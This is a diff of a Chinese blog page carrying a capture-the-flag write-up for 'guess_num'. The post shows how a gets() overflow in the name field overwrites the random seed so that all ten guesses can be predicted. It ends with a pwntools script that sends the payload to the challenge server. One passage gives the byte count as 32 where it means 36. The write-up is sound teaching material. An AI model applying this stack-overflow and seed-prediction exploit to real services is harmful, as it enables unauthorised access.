@@ -20,12 +20,12 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。 v6来自伪随机函数rand() rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。 此处种子为seed  该图中地址为ida地址，1代表1个字节   该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种">
+<meta name="description" content="可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。 v6来自伪随机函数rand() rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。 此处种子为seed  该图中地址为ida地址，1代表1个字节  该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我">
 <meta property="og:type" content="article">
 <meta property="og:title" content="AD_guess_num">
 <meta property="og:url" content="http://example.com/2021/03/16/AD-guess-num/index.html">
 <meta property="og:site_name" content="划水骗分二十年，没人比我更懂蒻">
-<meta property="og:description" content="可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。 v6来自伪随机函数rand() rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。 此处种子为seed  该图中地址为ida地址，1代表1个字节   该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种">
+<meta property="og:description" content="可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。 v6来自伪随机函数rand() rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。 此处种子为seed  该图中地址为ida地址，1代表1个字节  该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/03/16/AD-guess-num/1.png">
 <meta property="og:image" content="http://example.com/2021/03/16/AD-guess-num/2.png">
@@ -217,21 +217,17 @@
     
     <div class="post-body" itemprop="articleBody">
         <img src="/2021/03/16/AD-guess-num/1.png" class>
-
 <p>可以看出要进行10次猜测，保证每次猜测（v4）与v6相等，即可执行sub_C3E，sub_C3E是能得到的flag函数。</p>
 <p>v6来自伪随机函数rand()</p>
 <p>rand()需要srand()提供的种子，只要种子相同，rand()就一定相同。</p>
 <p>此处种子为seed</p>
 <img src="/2021/03/16/AD-guess-num/2.png" class>
-<p>该图中地址为ida地址，1代表1个字节</p>
-<img src="/2021/03/16/AD-guess-num/1.jpg" class>
-
+<p>该图中地址为ida地址，1代表1个字节 <img src="/2021/03/16/AD-guess-num/1.jpg" class></p>
 <p>该程序用gets来读取&amp;v7（name）（），所以可以用名字覆盖种子（写入我们需要的种子），再另外写一个cpp程序来看看该种子对应的rand（）函数值。</p>
 <p><strong>ida地址表示1相当于1个字节</strong></p>
 <p>名字写入0x24个a，相当于从客户端·输入32个a，一个a一个字节，刚好覆盖完-30h到-10h的地址，触及seed的地址，seed的类型是unsigned int，故seed[0]的大小为4个字节，故选取的种子4个a。</p>
 <p>这里特别要注意，由于题目本身是在linux下的，所以我们自己写的程序也要在linux下进行测试，不同的平台所产生的结果是不同的（我吐了，卡了老子这久）</p>
 <img src="/2021/03/16/AD-guess-num/2.jpg" class>
-
 <p><em>顺便需要学习在Linux中编写c</em></p>
 <p><em>首先确保安装了gcc，g++。我的linux里已经有了</em></p>
 <p><em>新建文件夹命名为xxx.cpp或xxx.c</em></p>
@@ -242,10 +238,9 @@
 <p>回到这题</p>
 <p>附件只提供参考，flag不在附件中，如果单纯运行附件答题能成功，但给不出flag（怎么想怎么对，我之前竟然不知道）</p>
 <p>所以有两个方法完成这题</p>
-<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag </p>
+<p>第一种方法nc服务器，输入0x24个a，也就是36个a，答题，得到flag</p>
 <p>第二种方法是使用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">47746</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">ans=[<span class="number">5</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">	io.recvuntil(<span class="string">&quot;Please input your guess number:&quot;</span>)</span><br><span class="line">	io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
 
     </div>
 
